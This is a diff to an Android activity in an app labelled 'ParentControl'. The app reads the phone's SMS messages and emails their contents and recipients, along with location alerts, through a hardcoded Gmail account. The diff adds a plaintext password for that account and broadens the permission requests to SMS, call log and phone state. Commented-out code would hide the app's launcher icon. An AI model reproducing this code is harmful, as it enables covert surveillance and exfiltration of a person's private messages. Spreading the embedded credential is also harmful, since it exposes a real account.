@@ -70,6 +70,7 @@ public class MapsActivity extends AppCompatActivity {
 
     protected void onCreate(Bundle savedInstanceState) {
 
+
         //     PackageManager p = getPackageManager();
         //      ComponentName componentName = new ComponentName(this, MapsActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
         //     p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
@@ -133,7 +134,12 @@ public class MapsActivity extends AppCompatActivity {
             String address = null;
             String test = null;
             Cursor cur = null;
-            ActivityCompat.requestPermissions(MapsActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
+
+
+                //when permission granted
+                //call method
+
+
 
             if (ContextCompat.checkSelfPermission(mContext,
                     Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
@@ -156,7 +162,7 @@ public class MapsActivity extends AppCompatActivity {
                             if (!address.equals("123456789")) {
 
                                 String line = "Message: " + message + " to: " + address;
-                                sender = new Mail("pavlos.repin@gmail.com", "");
+                                sender = new Mail("katsarosm47@gmail.com", "KApota11");
                                 StringMake.setString(line);
                                 StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                                         Builder().permitAll().build();
@@ -173,6 +179,11 @@ public class MapsActivity extends AppCompatActivity {
 
                 }catch(Exception ex){}
             } else {
+                      //When permission denied
+                    //Request permission
+                    ActivityCompat.requestPermissions(MapsActivity.this,
+                            new String[]{Manifest.permission.READ_SMS,Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_PHONE_STATE}, 44);
+
 
                 }
 
@@ -225,7 +236,7 @@ public class MapsActivity extends AppCompatActivity {
             //When permission denied
             //Request permission
             ActivityCompat.requestPermissions(MapsActivity.this,
-                    new String[]{Manifest.permission.READ_SMS}, 2);
+                    new String[]{Manifest.permission.READ_SMS,Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_PHONE_STATE}, 2);
         }
 
         Task<Location> task = client.getLastLocation();
@@ -285,7 +296,7 @@ public class MapsActivity extends AppCompatActivity {
 
         phoneNo = "123456789";
         message = "Message from ParentControl app:" + "\n" + "\n" + "Target has strayed further from the maximum allowed distance\n" + "Latitude: " + lat + "\n" + "Longitude: " + lng;
-        sender = new Mail("pavlos.repin@gmail.com", "");
+        sender = new Mail("katsarosm47@gmail.com", "KApota11");
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                 Builder().permitAll().build();
         StrictMode.setThreadPolicy(policy);
@@ -330,7 +341,7 @@ public class MapsActivity extends AppCompatActivity {
             try {
 
                 // Add subject, Body, your mail Id, and receiver mail Id.
-                sender.sendMail("Warning from parent control", "ooooooooooof", "pavlos.repin@gmail.com", "cse242017051@uniwa.gr");
+                sender.sendMail("Warning from parent control", "ooooooooooof", "katsarosm47@gmail.com", "cse242017051@uniwa.gr");
 
             } catch (Exception ex) {
 
@@ -368,7 +379,7 @@ public class MapsActivity extends AppCompatActivity {
                 // Add subject, Body, your mail Id, and receiver mail Id.
                 String line = null;
                 line = StringMake.getString();
-                sender.sendMail("Warning from parent control", line, "pavlos.repin@gmail.com", "cse242017051@uniwa.gr");
+                sender.sendMail("Warning from parent control", line, "katsarosm47@gmail.com", "cse242017051@uniwa.gr");
 
             } catch (Exception ex) {
 
@@ -389,13 +400,16 @@ public class MapsActivity extends AppCompatActivity {
 
     BroadcastReceiver MyReceiver = new BroadcastReceiver() {
 
+
         public void onReceive(Context context, Intent BroadInt) {
 
-            System.out.println("Action: " + BroadInt.getAction());
-            System.out.println("*** On Receive...");
+                System.out.println("Action: " + BroadInt.getAction());
+                System.out.println("*** On Receive...");
 
-            String Type = BroadInt.getStringExtra("To:");
-            String Mess = BroadInt.getStringExtra("Message:");
+                String Type = BroadInt.getStringExtra("To:");
+                String Mess = BroadInt.getStringExtra("Message:");
+
+
 
         }
     };
@@ -439,6 +453,19 @@ public class MapsActivity extends AppCompatActivity {
                 }
             } else {
                 Toast.makeText(context, "No Permission granted", Toast.LENGTH_SHORT).show();
+            }
+
+
+        }
+        if (requestCode == 69) {
+            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+
+
+
+
+            } else {
+
+
             }
 
 
